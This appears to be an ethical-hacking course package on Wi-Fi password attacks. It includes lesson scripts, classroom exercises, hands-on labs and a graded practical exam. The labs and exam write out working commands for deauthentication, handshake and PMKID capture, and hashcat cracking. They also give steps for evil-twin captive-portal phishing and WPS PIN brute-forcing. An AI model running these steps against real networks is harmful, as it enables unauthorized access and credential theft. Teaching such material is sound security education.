* Whether the password appears in the dictionary list

---

## **6. Brute-Force Attacks**

The attacker tries **every possible combination**, such as:

```
a
b
c
...
aa
ab
ac
...
A1b2C3d4
```

**The more complex the password, the longer it takes.**

Examples:

* 8-character password = hours or days
* 12-character strong password = **years or centuries**
* Long passphrases (e.g., “I love my dog 2024”) = practically uncrackable with current technology

---

# ⭐ **Additional Notes for Students (Important Concepts Explained Simply)**

### **What is a Wi-Fi Handshake?**

When a device connects to Wi-Fi, it performs a **4-step conversation** with the router to prove it knows the password.
Attackers can **capture** this conversation and crack it offline.

### **Why hashes matter:**

Attackers rarely need the real password immediately.
They only need the **hash**, which is a scrambled version of the password that they can crack later.

### **Why strong passwords defeat cracking:**

Even with supercomputers, long randomized passwords are nearly impossible to guess.

### **Why phishing still succeeds:**

Because *humans* are easier to trick than cryptography is to break.

---

# ✔️ **Summary Table (for rapid teaching)**

| Attack Type             | Example            | Target | Needs Client? | Offline Cracking? | Difficulty                 |
| ----------------------- | ------------------ | ------ | ------------- | ----------------- | -------------------------- |
| Social Engineering      | Evil Twin          | User   | Yes           | No                | Easy                       |
| Captive Portal Phishing | Fake login page    | User   | Yes           | No                | Easy                       |
| WPS Brute-Force         | WPS PIN flaw       | Router | Yes           | No                | Medium                     |
| PMKID Attack            | PMKID hash capture | Router | No            | Yes               | Easy–Medium                |
| Dictionary Attack       | Wordlist testing   | Hash   | No            | Yes               | Medium                     |
| Brute-Force             | All combinations   | Hash   | No            | Yes               | Hard (depends on password) |

---

# ✔️ **How to Defend Against All These Attacks (Include in Your Lesson)**

### **1. Disable WPS**

Removes a major vulnerability.

### **2. Use WPA3 if possible**

### **3. Use long, random passwords**

E.g.,
`Lime!27_Orange_Cloud$Rabbit`

### **4. Don’t reuse passwords**

### **5. Train users not to enter Wi-Fi passwords into login pages**

### **6. Verify Wi-Fi network names before connecting**

### **7. Use a VPN on public Wi-Fi**

### **8. Keep firmware updated**

---

Below are **high-quality class exercises and hands-on lab activities** designed for students **with zero cybersecurity background** but suitable for a real ethical hacking course.
They are grouped into:

1. **Theory Exercises (Classroom)**
2. **Hands-On Labs (Practical Wi-Fi Attacks)**
3. **Homework Assignments**
4. **Instructor Notes + Safety Guidelines**

Everything is ready for you to teach.

---

# 🧠 **1. THEORY EXERCISES (CLASSROOM ACTIVITIES)**

These require no laptop tools—only discussion, writing, and role-play.

---

## **Exercise 1: Identify The Attack Type**

Give students the following scenarios and ask them to identify the attack type.

| Scenario                                                                  | Student Answer (Attack Type) |
| ------------------------------------------------------------------------- | ---------------------------- |
| User forced off Wi-Fi, then reconnects to a fake Wi-Fi with the same name | __________                   |
| User enters their password on a fake-looking login page                   | __________                   |
| Attacker uses a tool to guess the WPS PIN                                 | __________                   |
| Attacker captures a handshake and uses a GPU to try millions of passwords | __________                   |

**Learning Goal:**
Students learn to classify attacks by category.

---

## **Exercise 2: Social Engineering Role-Play**

Pair the students:

* One plays the **attacker**
* One plays the **victim**

**Scenario:**
The attacker must “convince” the victim to enter their Wi-Fi password into a captive portal or login page.

Examples:

* “Your router requires a firmware upgrade. Please confirm your Wi-Fi password.”
* “Session expired. Re-enter Wi-Fi password to continue.”

Afterward, discuss:

* Which tactics worked?
* Which failed?
* What should the victim have looked out for?

---

## **Exercise 3: Password Strength Challenge**

Give students 10 sample Wi-Fi passwords. They must:

* Rank them from weakest → strongest
* Identify which are vulnerable to dictionary/brute-force attacks
* Suggest improvements

Example list:

```
12345678  
john2023  
KenyaWiFi  
Mombasa@2024  
X!pQ7d&92#lW  
```

---

## **Exercise 4: Understanding the 4-Way Handshake**

Ask students to draw a simple diagram of:

* Client
* Access Point
* Message 1 → 2 → 3 → 4

Goal:
Students understand **why capturing the handshake allows offline cracking**.

---

## **Exercise 5: Defend the Network Challenge**

Give students a fictional company (e.g., “Sunrise Café Wi-Fi”) and ask them to write:

* The Wi-Fi risks they face
* Which attacks are most likely
* Their recommended defenses

---

# 🧪 **2. HANDS-ON LAB ACTIVITIES (PRACTICAL ETHICAL HACKING)**

All labs assume students are using **Kali Linux** or **Parrot OS** with an external Wi-Fi adapter that supports monitor mode.

> **IMPORTANT:** These labs must be conducted in a controlled classroom environment on networks you are permitted to test.
> You should set up a **dedicated training Wi-Fi network** for legal and ethical compliance.

---

## **Lab 1: Wi-Fi Reconnaissance & Network Scanning**

### **Objective:**

Teach students how attackers identify and analyze Wi-Fi networks.

### **Tools:**

* `airmon-ng`
* `airodump-ng`

### **Tasks:**

1. Put Wi-Fi adapter in monitor mode

   ```
   sudo airmon-ng start wlan0
   ```
2. Scan available Wi-Fi networks

   ```
   sudo airodump-ng wlan0mon
   ```
3. Students record:

   * SSID
   * BSSID
   * Channel
   * Encryption type
   * Signal strength

### **Learning Outcomes:**

* Understanding what information attackers use for targeting
* Identifying vulnerable networks (open, WPS-enabled)

---

## **Lab 2: Capturing the 4-Way Handshake**

### **Objective:**

Demonstrate how attackers capture the encrypted Wi-Fi handshake.

### **Tools:**

* `airodump-ng`
* `aireplay-ng`

### **Tasks:**

1. Start capturing packets on the target network

   ```
   sudo airodump-ng -c <channel> --bssid <router> -w capture wlan0mon
   ```
2. Force a client to reconnect (Deauthentication Attack):

   ```
   sudo aireplay-ng --deauth 10 -a <router> wlan0mon
   ```
3. Once the client reconnects, the **handshake** is captured.

### **Learning Outcomes:**

* How attackers obtain the hash
* Why deauth attacks work

---

## **Lab 3: PMKID Attack**

### **Objective:**

Capture PMKID without needing any connected client.

### **Tools:**

* `hcxdumptool`
* `hcxpcapngtool`

### **Tasks:**

1. Capture PMKID

   ```
   sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon
   ```
2. Convert for cracking

   ```
   hcxpcapngtool -o pmkid_hash.hc22000 pmkid.pcapng
   ```

### **Learning Outcomes:**

* Why PMKID attacks are powerful
* Difference between handshake and PMKID capture

---

## **Lab 4: Dictionary Attack (Offline)**

### **Objective:**

Crack the handshake or PMKID using a wordlist.

### **Tools:**

* `hashcat`

### **Tasks:**

1. Run dictionary attack

   ```
   hashcat -m 22000 pmkid_hash.hc22000 wordlist.txt
   ```

2. Students compare:

   * Weak passwords vs strong passwords
   * Time taken to crack

### **Learning Outcomes:**

* Password complexity directly affects crack time
* How GPU cracking tools operate

---

## **Lab 5: Evil Twin + Captive Portal Simulation**

**This is the most fun and high-impact practical lab.**

### **Objective:**

Teach how attackers trick users into giving their password.

### **Tools:**

* `hostapd` / `airbase-ng`
* `dnsmasq`
* Fake captive portal (you provide HTML template)

### **Tasks:**

1. Set up a fake AP with the same SSID as your training network.
2. Run DHCP & DNS to redirect all traffic.
3. Display a fake login page:

   * “Wi-Fi password required for network validation.”
4. Students take turns:

   * Being the attacker running the Evil Twin
   * Being the user who must detect the phishing attempt

### **Learning Outcomes:**

* How easy phishing is
* How users can be tricked
* How to detect fake Wi-Fi hotspots

---

# 🏠 **3. HOMEWORK / TAKE-HOME ASSIGNMENTS**

## **Homework 1: Create a Wi-Fi Security Checklist**

Students must include:

* Router settings
* Strong password rules
* User awareness tips
* Device hardening tips

---

## **Homework 2: Explain One Attack in Simple Language**

Students choose ANY attack and explain it like they’re teaching a 10-year-old child.

Goal:
Build communication & understanding.

---

## **Homework 3: Build Your Own Wordlist (Custom Dictionary)**

Students create a themed list, e.g.:

* Kenyan passwords
* Common local names
* Years
* Variations

---

## **Homework 4: Research Activity — “How secure is WPA3?”**

Students must research:

* PMF
* SAE
* Differences from WPA2
* Potential weaknesses

---

# 🧑‍🏫 **4. INSTRUCTOR NOTES + SAFETY GUIDELINES**

### **Always teach in a legal, controlled environment.**

Students should ONLY practice on:

* classroom networks
* routers you own
* routers designated for learning

### **Prohibited:**

* Cracking neighbor Wi-Fi
* Attacking public Wi-Fi
* Practicing on any personal home router unless you own it

### **Explain Ethical Hacking Principles:**

* **Authorization**
* **Non-disclosure**
* **Protecting user data**
* **Reporting vulnerabilities responsibly**

### **Prepare Required Classroom Equipment:**

* A dedicated training router
* External Wi-Fi adapters for each student
* Preconfigured fake login portal
* Preloaded wordlists
* Handout with lab commands

---  


## 🎣 Social Engineering & Phishing Attacks

These attacks focus on tricking the user into voluntarily giving up the password.

### 1. Evil Twin Attack (Rogue Access Point)

This is a highly effective, active attack that targets the user, not the encryption.

* **How it Works:** The attacker sets up a malicious Access Point (AP) that has the **same SSID (network name)** as a legitimate one nearby (e.g., "Starbucks Free Wi-Fi"). This is the "Evil Twin." The attacker may also use a **Deauthentication Attack** on the legitimate network to force users to disconnect.
* **Password Capture:** When a user's device attempts to automatically connect to the stronger, malicious "Evil Twin" signal, the attacker redirects them to a **fake login portal (captive portal)** designed to look like the real one. This portal prompts the user to "re-enter their Wi-Fi password for verification" or "accept new terms." The password entered by the user is then captured by the attacker.

### 2. Captive Portal Phishing

As a part of the Evil Twin attack, this technique uses a convincing web page. The user connects to the rogue AP and is presented with a web page demanding the Wi-Fi password to proceed, often with a convincing-sounding reason like "Security Upgrade Required."

---

## ⚙️ Protocol Exploitation Attacks

These attacks exploit flaws in the Wi-Fi authentication or setup protocols themselves.

### 3. Wi-Fi Protected Setup (WPS) Brute-Force Attack

This is one of the most significant weaknesses in older routers. WPS was designed to make connecting easy using an 8-digit PIN, but a design flaw makes it incredibly vulnerable.

* **The Flaw:** The WPS PIN is authenticated in **two halves** (4 digits and 3 digits + 1 checksum digit). The router reports whether the first half is correct before checking the second. This reduces the number of possible attempts from $10^8$ (100 million) to $10^4 + 10^3 = 11,000$ possibilities.
* **Password Capture:** Specialized tools can **online brute-force** the PIN in a matter of hours. Once the 8-digit PIN is recovered, the router reveals the full WPA/WPA2 Pre-Shared Key (PSK), which is the password.

### 4. PMKID Attack

This is a newer technique that, in some cases, can be faster than the traditional 4-Way Handshake capture.

* **How it Works:** The **PMKID (Pairwise Master Key Identifier)** is an optional data field found in the first frame of the WPA/WPA2 handshake process. This field is essentially a hash that can be used to prove the client and the Access Point share the same Wi-Fi password.
* **Password Capture:** Unlike the 4-Way Handshake, which requires a connected client and a Deauthentication Attack, the PMKID can often be retrieved from a **single packet** sent by the router (Access Point) itself. The captured PMKID hash is then taken **offline** for a standard dictionary or brute-force attack.

---

## 🔐 Direct Cracking Attacks

These rely on computing power to break the password hash.

### 5. Dictionary and Brute-Force Attacks (Offline)

While not a capture method, these are the indispensable second step for any handshake or PMKID attack.

* **How it Works:** The captured handshake or PMKID is a hash (an encrypted representation of the password). The attacker uses powerful hardware (like GPUs) to rapidly test millions or billions of potential passwords against the captured hash.
* **Dictionary Attack:** Uses a list of common passwords, phrases, and common patterns.
* **Brute-Force Attack:** Systematically tries every possible combination of characters until the correct one is found. The longer and more complex the original Wi-Fi password is, the longer this process takes (potentially years).





Below is a **professional, ready-to-teach instructor version with full teaching scripts**, transitions, explanations, timing, and demonstration cues.
You can use this **as your lesson plan** for your cybersecurity class.

---

# ✅ **INSTRUCTOR VERSION — FULL TEACHING GUIDE & SCRIPTS**

**Topic:** Wi-Fi Attacks: Social Engineering, Protocol Exploitation, and Direct Cracking
**Audience:** Students with zero cybersecurity background
**Class Duration:** 2–3 hours (theory + labs)

---

# 🟦 **SECTION 1 — INTRODUCTION (5 minutes)**

### **Instructor Script**

"Today, we are learning how attackers steal Wi-Fi passwords.
Ethical hackers study these attacks so they can protect networks—not misuse the knowledge.

Everything we'll do is legal because we are using a **controlled training network**.
By the end of the lesson, you’ll understand:

1. How attackers steal Wi-Fi passwords
2. How to perform these techniques ethically
3. How to defend networks against these attacks"

---

# 🟦 **SECTION 2 — ATTACK CATEGORIES (10 minutes)**

### **Instructor Script**

"Every Wi-Fi attack in the world falls into one of **three categories**.
Think of them as three different ways of breaking into a house:

1. **Trick the owner into opening the door** → Social Engineering
2. **Find a weakness in the lock** → Protocol Exploitation
3. **Smash the door with force** → Direct Cracking

We will explore all three categories today."

---

# 🟩 **SECTION 3 — SOCIAL ENGINEERING ATTACKS (20 minutes)**

## **3.1 Evil Twin Attack**

### **Instructor Script**

"Imagine you walk into a coffee shop. You expect a Wi-Fi called ‘Starbucks Wi-Fi.’
What stops an attacker from creating a fake Wi-Fi with the same name?

Nothing.

This is called an **Evil Twin Attack**. The victim connects to the attacker’s network because it has a stronger signal. After that, the attacker shows you a fake login page asking for the password."

### **Key Teaching Cue**

Draw two Wi-Fi networks on the board:

* Real → Starbucks Wi-Fi
* Fake → Starbucks Wi-Fi (attacker)

### **Ask Students**

* “What would make you connect to the wrong one?”
  (Answer: signal strength, name similarity, device auto-connect)

---

## **3.2 Captive Portal Phishing**

### **Instructor Script**

"After connecting to the fake Wi-Fi, the attacker redirects you to a **fake website** saying:
‘Your session has expired, please re-enter your Wi-Fi password.’

Most people trust these prompts, making this one of the most successful attacks."

### **Show Example**

Display a screenshot of a fake portal (you can create a simple HTML page).

---

# 🟦 **SECTION 4 — PROTOCOL EXPLOITATION (30 minutes)**

## **4.1 WPS Brute-Force Attack**

### **Instructor Script**

"WPS is a feature that was supposed to make connecting easy.
But the design contains a serious flaw:
The 8-digit PIN is split into **two halves** when verified.

Technically, attackers only need to brute-force **11,000 combinations**, not 100 million.

Once the PIN is cracked, the router gives away the **real Wi-Fi password**, no matter how strong it is."

### **Demonstration Cue**

Show the math on the board:

```
10,000 + 1,000 = 11,000 possibilities
```

---

## **4.2 PMKID Attack**

### **Instructor Script**

"Older attacks required a client to be connected.
But the PMKID attack doesn’t.
We can request a special hash from the router without kicking anyone off.

It’s like asking the router:
‘Prove you know your own password,’
and it responds with a hash that we can try to crack offline."

### **Teaching Cue**

Explain that PMKID = “Pairwise Master Key Identifier.”

---

# 🟦 **SECTION 5 — DIRECT CRACKING (25 minutes)**

## **5.1 Dictionary Attack**

### **Instructor Script**

"When attackers get a handshake or PMKID, they don’t know the password directly.
They only get a **hash**, which is like a scrambled fingerprint of the password.

A dictionary attack compares each guess with the fingerprint until a match is found."

### **Ask Students**

"What happens if the password is too strong or not in the wordlist?"
(Answer: It won’t be cracked.)

---

## **5.2 Brute-Force Attack**

### **Instructor Script**

"Brute-force tries every possible combination.
If your password is short, it might be cracked in minutes.

But if your password is long and random,
even a supercomputer can take centuries."

### **Demonstration Cue**

Write two passwords on the board:

* “mombasa2024”
* “X!pQ7d&92#lW”

Ask: “Which one will crack first? Why?”

---

# 🟥 **SECTION 6 — DEFENSE STRATEGIES (15 minutes)**

### **Instructor Script**

"For each attack we just studied, there is a defense."

* Disable WPS
* Use strong passphrases
* Train users not to enter Wi-Fi passwords on web pages
* Verify SSID before connecting
* Use WPA3
* Keep router firmware updated
* Never reuse passwords

### **Ask Students**

"Which of these is easiest for the average user to do? Which is hardest?"

---

# 🟧 **SECTION 7 — CLASS ACTIVITIES (15 minutes)**

## **Activity 1 — Attack Identification**

Present scenarios and let students categorize the attack.

## **Activity 2 — Password Strength Ranking**

Give 10 sample passwords. Students rank weakest → strongest.

## **Activity 3 — Social Engineering Role-Play**

Pairs act out attacker–victim phish scenarios.

---

# 🟪 **SECTION 8 — LAB PRACTICALS (60–90 minutes)**

Each lab has a **script** for you to say during the demonstration.

---

# 🧪 **LAB 1 — Wi-Fi Recon (airodump-ng)**

### **Instructor Script**

"Before an attacker does anything, they scan the environment.
You’re going to see all nearby Wi-Fi networks and information about them."

### **Steps**

1. `sudo airmon-ng start wlan0`
2. `sudo airodump-ng wlan0mon`

### **What to Ask Students**

* “Which networks use WPA2 or WPA3?”
* “Which network has the strongest signal?”

---

# 🧪 **LAB 2 — Handshake Capture**

### **Instructor Script**

"Next, we capture the Wi-Fi handshake, which lets us attempt cracking later."

### **Steps**

1. Capture packets
2. Deauthenticate a client
3. Wait for reconnection → handshake captured

### **Teaching Tip**

Explain why deauthentication works:
Wi-Fi does **not** authenticate deauth frames.

---

# 🧪 **LAB 3 — PMKID Attack**

### **Instructor Script**

"This attack doesn’t even disturb clients.
We simply request PMKID from the router."

### **Steps**

* Use `hcxdumptool` to grab PMKID
* Convert to hashcat format

---

# 🧪 **LAB 4 — Hash Cracking with Hashcat**

### **Instructor Script**

"Now we test how long it takes to crack weak vs strong passwords."

### **Steps**

* Run dictionary attack
* Compare results

### **Ask Students**

“How can we prevent this attack?”

---

# 🧪 **LAB 5 — Evil Twin + Captive Portal Simulation**

### **Instructor Script**

"This is how attackers trick users into handing over their password.
Today, you’ll create a fake Wi-Fi network and a login portal."

### **Steps**

* Create fake AP
* Redirect traffic with DNS spoofing
* Display phishing portal
* Collect password submissions

### **Discussion**

* Why did the victims fall for it?
* What signs reveal the attack?

---

# 🟦 **SECTION 9 — END-OF-CLASS REVIEW (5 minutes)**

### **Instructor Script**

"Today we learned how Wi-Fi attacks happen and how to protect against them.
Remember: Ethical hacking is about **responsibility**, **authorization**, and **improving security**."

Ask:

* “Which attack surprised you the most?”
* “Which defense do you feel is most important?”

---


# **🔥 Advanced Wi-Fi Security Practical Examination (Senior Level)**

### **Format:** Full Practical | Duration: 2.5–3 hrs

### **Weight:** 60% practical execution, 40% reporting & explanation

### **Tools Allowed:** Kali Linux, Aircrack-ng suite, Bettercap, Hashcat, Wireshark, hcxtools, Python

### **Environment:** Controlled lab network with instructor-prepared APs

---

# **🧪 Overview**

Learners will be assigned:

* **3 Wi-Fi networks**, each with different security weaknesses
* **1 rogue client device** (simulated)
* A scenario requiring them to **perform attacks, capture evidence, analyze results, and recommend security improvements**

Students must demonstrate mastery of **social engineering, protocol exploitation, and direct cracking techniques** *ethically*.

---

# **🧩 Practical Tasks**

---

## **Task 1 — Reconnaissance & Network Profiling (10 Marks)**

Students must:

1. Scan wireless spectrum using:

   * `airodump-ng`
   * or `bettercap -iface wlan0`
2. Identify Access Points with:

   * Open authentication
   * WPA2-PSK
   * WPS enabled
   * Hidden SSID
   * MAC filtering
3. Document:

   * Channel, BSSID, vendor
   * Encryption type
   * Whether a handshake or PMKID is collectible

**Deliverable:** Evidence screenshots + written interpretation.

---

## **Task 2 — PMKID Extraction + Offline Cracking (15 Marks)**

Against a designated AP:

1. Use `hcxdumptool` to request PMKID
2. Convert to Hashcat format using `hcxpcapngtool`
3. Run dictionary or brute-force attack
4. Recover password (if possible)
5. If crack fails, justify why (entropy, password complexity)

**Deliverable:** Cracked key + cracking methodology + reasoning.

---

## **Task 3 — Deauthentication Attack + 4-Way Handshake Capture (15 Marks)**

Perform an active attack on the designated WPA2 network:

1. Force client disconnection using:

   ```
   aireplay-ng --deauth 10 -a <bssid> -c <client> wlan0
   ```
2. Capture handshake using `airodump-ng`
3. Validate handshake in Wireshark (EAPOL packets)
4. Attempt offline cracking
5. Compare cracking difficulty vs PMKID attack

**Deliverable:**

* Capture file
* Screenshots
* Explanation of packet sequence

---

## **Task 4 — Evil Twin + Captive Portal Attack Simulation (10 Marks)**

Students must build a *rogue AP*:

1. Clone SSID
2. Use either:

   * `hostapd-wpe`
   * Bettercap Wi-Fi Evil Twin module
3. Deploy captive portal prompting for a password
4. Capture submitted credentials
5. Demonstrate detection techniques

**Deliverable:**

* Password log
* Screenshots of fake portal
* Ethical considerations analysis

---

## **Task 5 — WPS Vulnerability Assessment (10 Marks)**

On the provided router with WPS exposed:

1. Enumerate WPS state using:
   `wash` or `bully`
2. Attempt **WPS PIN brute-force**
3. Recover WPA2 key if successful
4. Provide full security recommendations for WPS hardening

**Deliverable:**

* WPS PIN (if cracked)
* Root cause explanation

---

## **Task 6 — Defense Implementation & Hardening (20 Marks)**

Using a different router or virtual AP, students must **secure the Wi-Fi network** against ALL previous attacks:

1. Disable WPS
2. Enable WPA3-SAE (if available)
3. Implement strong passphrase policy
4. Enable client isolation
5. Change management SSID & admin settings
6. Harden against Evil Twin detection:

   * Certificate-based authentication
   * Device trust stores

**Deliverable:**

* Hardened config printout or screenshots
* Before/after comparison table
* Threat mitigation explanation

---

# **📊 Marking Scheme (100 Marks Total)**

| Component                                               | Marks |
| ------------------------------------------------------- | ----- |
| **Task 1** – Reconnaissance & Profiling                 | 10    |
| **Task 2** – PMKID Capture & Cracking                   | 15    |
| **Task 3** – Deauth + Handshake Capture                 | 15    |
| **Task 4** – Evil Twin Simulation                       | 10    |
| **Task 5** – WPS Exploitation                           | 10    |
| **Task 6** – Defense & Hardening                        | 20    |
| **Report Quality** (clarity, screenshots, explanations) | 10    |
| **Ethical & Legal Justification**                       | 10    |

**Pass mark:** 50%
**Distinction:** 80%+

---

# **📘 Deliverables Required**

Students must submit:

* `pcap` or `pcapng` files
* Hashes used for cracking
* Screenshots of all major steps
* Final report in PDF
* Explanation of each result

---  





